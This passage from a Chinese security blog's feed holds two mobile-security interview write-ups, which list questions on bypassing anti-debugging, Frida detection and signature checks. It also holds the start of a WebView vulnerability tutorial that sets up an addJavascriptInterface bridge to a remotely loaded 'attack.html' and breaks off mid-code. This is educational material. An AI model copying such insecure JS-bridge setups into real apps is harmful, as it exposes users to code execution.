    <category term="移动安全面试" scheme="http://security-kitchen.com/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8%E9%9D%A2%E8%AF%95/"/>
    
    
    <category term="移动安全面试" scheme="http://security-kitchen.com/tags/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8%E9%9D%A2%E8%AF%95/"/>
    
    <category term="面试" scheme="http://security-kitchen.com/tags/%E9%9D%A2%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>移动安全面试（2）——2023届快手秋季招聘面试</title>
    <link href="http://security-kitchen.com/2023/03/08/interview0002/"/>
    <id>http://security-kitchen.com/2023/03/08/interview0002/</id>
    <published>2023-03-08T02:22:19.000Z</published>
    <updated>2023-12-23T09:13:44.116Z</updated>
    
    <content type="html"><![CDATA[<p>大家好，我是同学小F，某211硕士研究生，今天给大家介绍一下秋季的面试经历，今年秋招形势很难，投了好几家公司简历都没过，本科的时候也尝试找了下工作，当时基本大厂和国企基本拿了一些，后来保研就留在本校了，想着环境熟悉并且在原来的导师手下干活就没有去其他学校，今年在起初听到很多朋友说就业形势不好，其实也没想太多，然而真正等自己去找工作，才有点受打击。硕士期间主要在研究Android安全方向，漏洞、加壳与一些常见的逆向技术都有所涉及，硕士在校期间只发了一篇SCI 2区论文，一篇c会，然后就是实验室的各种项目经历了。</p><span id="more"></span><p>秋招提前批开始时，尝试了一些大厂，例如字节无恒，倒是给面试机会，不过一面完后就被挂了，而例如车厂，蔚来简历没过，后来到正式批了，又尝试了一些手机厂，想着大部分手机厂应该招移动安全人员，小米、荣耀、vivo都没有过简历，虽然小米给笔试（不过我朋友双9的就直接面试了），这属实是将信心有点打击。后来又试了一些企业，也拿了大厂、中厂、国企的offer，不过经历了新冠后，觉得可能生活更加重要吧，现在考到家这边的国家电网，准备躺平了。</p><p>最后结合自己的经历，给下半年秋招找工作的朋友一点建议，大家可以去实习，还是得去实习，实习经历很重要，再者安全很看成果，大家可以拿一些漏洞证书或CVE编号，以及打打ctf比赛，多在开源社区写写博客，制作开源工具等等，进一步提高自己知名度，硕士期间可能话还是可以发发高质量论文，这样之后的选择有很多，本来导师给我说继续本校硕博连读，不过想着自己读了太多年书了，所以就拒绝了，不过如果硕士期间有几篇不错论文，还是可以申请到很多高校读博的。</p><p>说了有点多，今天给大家分享一下快手的面试经历：（一轮初始+两轮复试+一轮hr面）</p><p><strong>一面：</strong></p><p>快手一面的面试官很和蔼，感觉交谈很融洽：</p><p><strong>基础知识：</strong></p><p>进程与线程区别？</p><p>计算机网络协议http与https的区别？</p><p>Android上中间人抓包的原理？如何进行防护？如何进行对抗？还有哪些抓包方式？非root环境可以抓包嘛？说说方案？现有的一些最难的抓包情况是怎么样的？flutter有了解么？遇到这种情况怎么进行抓包？除了你提到的这些通用抓包方案？还有没有其他思路？</p><p>Android动态加载壳、不落地加载壳、函数抽取壳的加壳原理以及脱壳方案？</p><p>了解Hook么，说下当前常用的一些hook方式？Xposed与Frida的原理，Frida与ptrace的关系，Frida和IDA能同时使用么？Frida绕过的常见方式？</p><p>IDA中F5防护的一些手段？</p><p>了解签名校验么？Android的签名机制？一些常用的签名校验方式？如何进行绕过？</p><p>了解重打包么？如何检测重打包？</p><p>Android中的漏洞挖掘了解么，列举你知道的经典漏洞原理？</p><p>问题大概就这些，然后最后面试官说道来我们手撕一道算法题，好像是一道简单题，有关排序问题的？给15问题在他们系统上写完？</p><p><strong>二面：</strong></p><p>二面问的感觉还挺深入的，好多问题没回答好？</p><p>vmp虚拟化如何实现对字段的虚拟化？</p><p>中断的具体汇编指令是哪个？   </p><p>中断hook的一些实现的函数方法？ </p><p>控制流平坦化的解决？ </p><p>符号执行解决虚假控制流？</p><p>frida的inlinehook具体修改哪几条指令？  </p><p>Magisk怎么实现root？    </p><p>Magisk和EdXposed的关系？</p><p>Xposed为什么不能在Android8.0上使用？</p><p>Android版本更新，机制的重大变化？</p><p>Magisk怎么进行隐藏指纹信息？  </p><p>不落地加载的基本原理？</p><p>got表hook和plt表hook的区别？</p><p>got表中有几种重定向的方式？</p><p>为了么可以删除section节区？</p><p>initarry的作用，可以没有initarry么？</p><p>针so里面的不同点字符加密怎么解决？</p><p>got表hook和inlinehook的优缺？</p><p>Dex2c的分析手段？</p><p>为什么Dex2C会影响性能？</p><p>ollvm中的不透明谓词有了解么？ 针对不透明谓词是怎么解决的？</p><p>Unicorn里面一些问题？</p><p><strong>三面：</strong></p><p>三面的面试官应该是一个组长，问的项目经历，然后就是两篇论文问了很多？</p><p>创新点、数据集、以后怎么做？</p><p>还有就是Android恶意应用对抗，现有的恶意应用中有很多对抗手段，是怎么进行考虑的，你来防护怎么做？</p><p>以后的职业规划？</p><p><strong>四面：</strong></p><p>hr问了下移动安全的发展？</p><p>Android的设备指纹防护？</p><p>再就是就业地点，一些其他问题了？</p><p>最后整体就是这样，希望大家找工作顺利，以后就膜拜各位安全大佬了。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;大家好，我是同学小F，某211硕士研究生，今天给大家介绍一下秋季的面试经历，今年秋招形势很难，投了好几家公司简历都没过，本科的时候也尝试找了下工作，当时基本大厂和国企基本拿了一些，后来保研就留在本校了，想着环境熟悉并且在原来的导师手下干活就没有去其他学校，今年在起初听到很多朋友说就业形势不好，其实也没想太多，然而真正等自己去找工作，才有点受打击。硕士期间主要在研究Android安全方向，漏洞、加壳与一些常见的逆向技术都有所涉及，硕士在校期间只发了一篇SCI 2区论文，一篇c会，然后就是实验室的各种项目经历了。&lt;/p&gt;</summary>
    
    
    
    <category term="移动安全面试" scheme="http://security-kitchen.com/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8%E9%9D%A2%E8%AF%95/"/>
    
    
    <category term="移动安全面试" scheme="http://security-kitchen.com/tags/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8%E9%9D%A2%E8%AF%95/"/>
    
    <category term="面试" scheme="http://security-kitchen.com/tags/%E9%9D%A2%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>移动安全面试（1）——2023届科大讯飞秋季招聘</title>
    <link href="http://security-kitchen.com/2023/03/08/interview0001/"/>
    <id>http://security-kitchen.com/2023/03/08/interview0001/</id>
    <published>2023-03-08T02:21:19.000Z</published>
    <updated>2023-12-23T09:13:44.116Z</updated>
    
    <content type="html"><![CDATA[<p>大家好！我是同学小B（小编修改），某末流985硕，我也分享一下我秋招其中一家公司的心得。作为一名研究生期间没有什么成果的同学，这里还希望各位大佬见谅！首先介绍一下本人，我是从事数据安全方向，之前实验室的一些项目中，也初步接触过移动安全的部分知识，不过大多是和隐私合规相关，不过在今年如此之卷的秋招，我处处碰壁后，就开始扩展了一下自己的知识面，进一步将移动安全的隐私合规的一些知识完善了一下。本人秋招期间应聘两家公司的移动安全岗位（科大讯飞和海康威视），今天和大家分享一下其中一家公司的面试心得。</p><span id="more"></span><p>科大讯飞的面试总共有四轮：1轮hr综合面试 + 1轮技术初试  + 1轮技术复试  + 1轮技术加试</p><p>**hr综合面试 **</p><p>有一说一，科大讯飞这家面试是我遇到最奇怪，居然上来是hr综合面试，不过面试官都比较和蔼，hr面试基本和其他没有什么区别，很多其实就是考察你的表达能力，或者你的一些逻辑思维能力，比如他们会问：</p><p>你为什么会选择做移动安全？</p><p>你怎么规划你平时的学习的？</p><p>你觉得工作之后怎么能进一步提升自己？</p><p>你曾经遇到的最困难的事？</p><p>考研为什么要跨考？</p><p>等等</p><p>我感觉其实大家hr面，只要放平心态都没什么问题。</p><p><strong>第一轮技术初试：</strong></p><p>第一轮初试是一个女面试官，在我面试那么多家公司，遇到安全类女面试官的次数好像还没有，对方也是很和蔼，问了一些我数据安全（分类分级、数据脱敏类的问题），侧重就放在隐私合规上面了。移动安全相关大概有：</p><p>你了解哪些移动端的隐私合规检测的工具？</p><p>你如何开展隐私合规检测的工作？</p><p>静态检测和动态检测的优劣是什么？</p><p>如果你来做隐私合规检测，你觉得现在行业内比较通用的方法是什么?</p><p>(这里说实在很多我都是死记硬背，当时看了看平安的隐私合规沙龙以及群主星球类的一些知识，就背下来了)</p><p>其中静态检测我说了更多关于nlp相关的东西，因为做数据分类分级的过程中对这些要擅长一点，平时和群主聊天也相互交流了一下，感觉还好。</p><p>然后就是问了一下规则与nlp的优劣，当前nlp存在的一些问题</p><p>基本这里就大致介绍，后面很多就是介绍科大他们的一些产品等等了</p><p><strong>第二轮技术复试：</strong></p><p>第二轮技术复试应该是他们的一个安全小组长的人吧，然后问的基本就是移动端相关的知识了</p><p>隐私方面：</p><p>主要问了一下项目的细节，里面隐私合规如何做到自动化的方法，其他倒是没有什么区别？</p><p>移动端：</p><p>Android里面的调试策略？反调试策略？怎么绕开反调试？针对你绕开反调试的方法怎么进行反制？</p><p>这里就回答了个一半吧</p><p>Android的脱壳技术了解么（这个我不太了解，就没继续问了）</p><p>如何开发自动化的隐私合规检测工具，说一下思路？</p><p>隐私合规动态检测有哪些方法？Xposed与frida的区别？</p><p>等等</p><p>后面就是同样的提问环节，通过询问好像科大里面移动安全就需求较少，不过问我后面除了做隐私合规，还可不可以做漏洞相关，我都表示可以，就结束了</p><p><strong>第三轮技术加试：</strong></p><p>本来我以为到第二轮结束，应该就完了，感觉也没啥问题要问的了。第三轮技术面试问的更多的是简历，将简历上项目都询问了一遍，然后问我预期薪资，我报了个中等的薪资，然后问了下期望的城市和手里有几个offer，大致这些情况就结束了。</p><p>整体情况就是这些，很高兴能分享我的面试心得，希望能帮助到大家！</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;大家好！我是同学小B（小编修改），某末流985硕，我也分享一下我秋招其中一家公司的心得。作为一名研究生期间没有什么成果的同学，这里还希望各位大佬见谅！首先介绍一下本人，我是从事数据安全方向，之前实验室的一些项目中，也初步接触过移动安全的部分知识，不过大多是和隐私合规相关，不过在今年如此之卷的秋招，我处处碰壁后，就开始扩展了一下自己的知识面，进一步将移动安全的隐私合规的一些知识完善了一下。本人秋招期间应聘两家公司的移动安全岗位（科大讯飞和海康威视），今天和大家分享一下其中一家公司的面试心得。&lt;/p&gt;</summary>
    
    
    
    <category term="移动安全面试" scheme="http://security-kitchen.com/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8%E9%9D%A2%E8%AF%95/"/>
    
    
    <category term="移动安全面试" scheme="http://security-kitchen.com/tags/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8%E9%9D%A2%E8%AF%95/"/>
    
    <category term="面试" scheme="http://security-kitchen.com/tags/%E9%9D%A2%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>Android App漏洞之战（20）——Webview漏洞详解</title>
    <link href="http://security-kitchen.com/2023/02/14/bug0020/"/>
    <id>http://security-kitchen.com/2023/02/14/bug0020/</id>
    <published>2023-02-14T01:09:19.000Z</published>
    <updated>2023-12-23T09:13:44.114Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>快半个月没有更新文章了，最近不少朋友催更了，今天我们进入Android APP漏洞之战系列文章中的一个重要篇幅——WebView漏洞，我们都知道在当下App漏洞中，WebView漏洞的占比是十分巨大的，各种类型的漏洞问题层出不穷，这篇文章就带着大家一起揭开WebView漏洞神奇的面纱。</p><span id="more"></span><p>本文第二节讲述WebView的基本知识</p><p>本文第三节讲述WebView的漏洞面</p><p>本文第四节进行了漏洞原理介绍和漏洞复现</p><p>总结：本文从WebView开发出发，从0开始进行漏洞的讲解和复现，花了几天时间，列举了WebView中的20多种漏洞案例，并手动复现了其中十余种案例，希望用这篇万字长文介绍WebView漏洞的基本发展。</p><h2 id="二、基础知识"><a href="#二、基础知识" class="headerlink" title="二、基础知识"></a>二、基础知识</h2><h3 id="1-WebView基础"><a href="#1-WebView基础" class="headerlink" title="1.WebView基础"></a>1.WebView基础</h3><h4 id="（1）WebView概述"><a href="#（1）WebView概述" class="headerlink" title="（1）WebView概述"></a>（1）WebView概述</h4><p>Android WebView在Android平台上是一个特殊的View，它能用来显示网页，这个WebView类可以被用来在app中仅仅显示一张在线的网页，还可以用来开发浏览器。</p><p>WebView内部实现是采用渲染引擎(WebKit)来展示view的内容，提供网页前进后退、网页放大、缩小、搜索等功能。Android WebView 在低版本和高版本采用了不同的 webkit 版本内核，在 4.4 版本后使用 Chrome 内核。</p><h4 id="（2）WebView作用"><a href="#（2）WebView作用" class="headerlink" title="（2）WebView作用"></a>（2）WebView作用</h4><ul><li>显示和渲染Web页面</li><li>直接使用html文件（网络上或本地assets中）作布局</li><li>可和JavaScript交互调用</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WebView控件功能强大，除了具有一般View的属性和设置外，还可以对url请求、页面加载、渲染、页面交互进行强大的处理。</span><br></pre></td></tr></table></figure><h4 id="（3）WebView基础使用"><a href="#（3）WebView基础使用" class="headerlink" title="（3）WebView基础使用"></a>（3）WebView基础使用</h4><h5 id="lt-1-gt-本地加载"><a href="#lt-1-gt-本地加载" class="headerlink" title="&lt;1&gt;本地加载"></a>&lt;1&gt;本地加载</h5><p>Web最简单显示网页内容，基本步骤：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.在布局文件中添加WebView控件；</span><br><span class="line">2.在代码中让WebView控件加载显示网页。</span><br></pre></td></tr></table></figure><p>具体操作：</p><p>首先，我们在布局文件中来添加WebView控件，如下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">WebView</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:id</span>=<span class="string">&quot;@+id/Wind_webview&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/1.png" alt="image-20220726171401583"></p><p>然后我们在代码中让WebView控件加载显示网页，如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获得控件</span></span><br><span class="line">       <span class="type">WebView</span> <span class="variable">webView</span> <span class="operator">=</span> (WebView) findViewById(R.id.Wind_webview);</span><br><span class="line">       <span class="comment">//访问网页</span></span><br><span class="line">       webView.loadUrl(<span class="string">&quot;http://www.baidu.com&quot;</span>);</span><br><span class="line">       <span class="comment">//系统默认会通过手机浏览器打开网页，为了能够直接通过WebView显示网页，则必须设置</span></span><br><span class="line">       webView.setWebViewClient(<span class="keyword">new</span> <span class="title class_">WebViewClient</span>()&#123;</span><br><span class="line">           <span class="meta">@Override</span></span><br><span class="line">           <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">shouldOverrideUrlLoading</span><span class="params">(WebView view, String url)</span> &#123;</span><br><span class="line">               <span class="comment">//使用WebView加载显示url</span></span><br><span class="line">               view.loadUrl(url);</span><br><span class="line">               <span class="comment">//返回true</span></span><br><span class="line">               <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;);</span><br></pre></td></tr></table></figure><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/2.png" alt="image-20220726171554052"></p><p>最后我们在配置文件中添加网络权限：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 添加网络权限 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.INTERNET&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/3.png" alt="image-20220726171648967"></p><p>运行程序，显示如下：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/4.png" alt="image-20220726171737615"></p><h5 id="lt-2-gt-远程加载"><a href="#lt-2-gt-远程加载" class="headerlink" title="&lt;2&gt;远程加载"></a>&lt;2&gt;远程加载</h5><p>首先，我们直接在本地新建js文件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Carson<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">         <span class="keyword">function</span> <span class="title function_">callAndroid</span>(<span class="params"></span>)&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="comment">//由于对象映射，所以调用test对象等于调用Android映射的对象</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            test.<span class="title function_">hello</span>(<span class="string">&quot;WindXaa!&quot;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">         &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">   <span class="comment">&lt;!--点击按钮则调用callAndroid函数--&gt;</span></span></span><br><span class="line"><span class="language-xml">   <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">id</span>=<span class="string">&quot;button1&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;callAndroid()&quot;</span>&gt;</span>Internet Click connect<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/26.png" alt="image-20220729155049524"></p><p>然后我们开启一个简易的http_server的监听</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/27.png" alt="image-20220729155135353"></p><p>我们编写代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="type">WebView</span> <span class="variable">mWebView</span> <span class="operator">=</span> (WebView) findViewById(R.id.Wind_webview1);</span><br><span class="line"><span class="type">WebSettings</span> <span class="variable">webSettings</span> <span class="operator">=</span> mWebView.getSettings();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置与Js交互的权限</span></span><br><span class="line">webSettings.setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过addJavascriptInterface()将Java对象映射到JS对象</span></span><br><span class="line"><span class="comment">//参数1：Javascript对象名</span></span><br><span class="line"><span class="comment">//参数2：Java对象名</span></span><br><span class="line">mWebView.addJavascriptInterface(<span class="keyword">new</span> <span class="title class_">AndroidtoJs</span>(), <span class="string">&quot;test&quot;</span>);<span class="comment">//AndroidtoJS类对象映射到js的test对象</span></span><br><span class="line">mWebView.loadData(<span class="string">&quot;&quot;</span>,<span class="string">&quot;text/html&quot;</span>,<span class="literal">null</span>);</span><br><span class="line"><span class="comment">// 加载JS代码</span></span><br><span class="line"><span class="comment">// 格式规定为:file:///android_asset/文件名.html</span></span><br><span class="line"><span class="comment">// mWebView.loadUrl(&quot;file:///android_asset/javascript.html&quot;);</span></span><br><span class="line">mWebView.loadUrl(<span class="string">&quot;http://ip地址填自己的/attack.html&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 提供接口在Webview中供JS调用</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AndroidtoJs</span> &#123;</span><br><span class="line">    <span class="comment">// 定义JS需要调用的方法，被JS调用的方法必须加入@JavascriptInterface注解</span></span><br><span class="line">    <span class="meta">@JavascriptInterface</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">(String msg)</span> &#123;</span><br><span class="line">        Log.e(<span class="string">&quot;WindXaa&quot;</span>,<span class="string">&quot;Hello，&quot;</span> + msg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们再次运行程序</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/28.png" alt="image-20220729155443281"></p><p>这里就说明我们远程加载文件成功了，我们点击按钮</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/29.png" alt="image-20220729160726979"></p><p>可以发现可以成功的通过JS调用Android代码</p><h3 id="2-WebView使用详解"><a href="#2-WebView使用详解" class="headerlink" title="2.WebView使用详解"></a>2.WebView使用详解</h3><h4 id="（1）WebView常用方法"><a href="#（1）WebView常用方法" class="headerlink" title="（1）WebView常用方法"></a>（1）WebView常用方法</h4><p><strong>WebView的状态：</strong></p><p>webView.onResume();</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">// 激活WebView为活跃状态，能正常执行网页的响应</span><br></pre></td></tr></table></figure><p>webView.onPause();</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 当页面被失去焦点被切换到后台不可见状态，需要执行onPause</span><br><span class="line">// 通过onPause动作通知内核暂停所有的动作，比如DOM的解析、plugin的执行、JavaScript执行。</span><br></pre></td></tr></table></figure><p>webView.pauseTimers()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 当应用程序(存在webview)被切换到后台时，这个方法不仅仅针对当前的webview而是全局的全应用程序的webview</span><br><span class="line">// 它会暂停所有webview的layout，parsing，javascripttimer。降低CPU功耗。</span><br></pre></td></tr></table></figure><p>webView.resumeTimers()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">// 恢复pauseTimers状态</span><br></pre></td></tr></table></figure><p>rootLayout.removeView(webView)</p><p>webView.destory()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// webview调用destory时，webview仍绑定在Activity上</span><br><span class="line">// 需要先从父容器中移除webview，然后再销毁webview</span><br></pre></td></tr></table></figure><p><strong>前进、后退网页</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//是否可以后退</span></span><br><span class="line">Webview.canGoBack()</span><br><span class="line"></span><br><span class="line"><span class="comment">//后退网页</span></span><br><span class="line">Webview.goBack()</span><br><span class="line"></span><br><span class="line"><span class="comment">//是否可以前进</span></span><br><span class="line">Webview.canGoForward()</span><br><span class="line"></span><br><span class="line"><span class="comment">//前进网页</span></span><br><span class="line">Webview.goForward()</span><br><span class="line"></span><br><span class="line"><span class="comment">//以当前的index为起始点前进或者后退到历史记录中指定的steps</span></span><br><span class="line"><span class="comment">//如果steps为负数则为后退，正数则为前进</span></span><br><span class="line">Webview.goBackOrForward(intsteps)</span><br></pre></td></tr></table></figure><p>在不做任何处理前提下，浏览网页时点击系统的“Back”键时，整个 Browser 会调用 finish()而结束自身，因此需要在当前Activity中处理并消费掉该 Back 事件，当按下返回键时，调用goBack方法。</p><p>我们可以做一些处理，让点击“Back”键后，让网页返回上一页而不是直接退出浏览器，此时我们可以在当前的Activity中处理Back事件，如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onKeyDown</span><span class="params">(<span class="type">int</span> keyCode, KeyEvent event)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((keyCode == KEYCODE_BACK) &amp;&amp; mWebView.canGoBack()) &#123;</span><br><span class="line">         mWebView.goBack();</span><br><span class="line"></span><br><span class="line">         <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">super</span>.onKeyDown(keyCode, event);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>清除缓存数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//清除网页访问留下的缓存</span><br><span class="line">//由于内核缓存是全局的因此这个方法不仅仅针对webview而是针对整个应用程序.</span><br><span class="line">Webview.clearCache(true);</span><br><span class="line"></span><br><span class="line">//清除当前webview访问的历史记录</span><br><span class="line">//只会webview访问历史记录里的所有记录除了当前访问记录</span><br><span class="line">Webview.clearHistory()；</span><br><span class="line"></span><br><span class="line">//这个api仅仅清除自动完成填充的表单数据，并不会清除WebView存储到本地的数据</span><br><span class="line">Webview.clearFormData()；</span><br></pre></td></tr></table></figure><h4 id="（2）常用类"><a href="#（2）常用类" class="headerlink" title="（2）常用类"></a>（2）常用类</h4><h5 id="lt-1-gt-WebSettings类"><a href="#lt-1-gt-WebSettings类" class="headerlink" title="&lt;1&gt;WebSettings类"></a><strong>&lt;1&gt;WebSettings类</strong></h5><p>作用：对WebView进行配置和管理</p><p>配置步骤：</p><p>第一步：添加访问网络权限（AndroidManifest.xml）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;uses-permission android:name=&quot;android.permission.INTERNET&quot;/&gt;</span><br></pre></td></tr></table></figure><p>注意：从Android 9.0（API级别28）开始，默认情况下禁用明文支持，会显示 <code>ERR_CLEARTEXT_NOT_PERMITTED</code>。因此http的url均无法在webview中加载，可以在manifest中application节点添加<code>android:usesCleartextTraffic=&quot;true&quot;</code>。</p><p>第二步：生成一个WebView组件（有两种方式）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//方式1：直接在在Activity中生成</span></span><br><span class="line"><span class="type">WebView</span> <span class="variable">webView</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WebView</span>(<span class="built_in">this</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//方法2：在Activity的layout文件里添加webview控件：</span></span><br><span class="line"><span class="type">WebView</span> <span class="variable">webview</span> <span class="operator">=</span> (WebView) 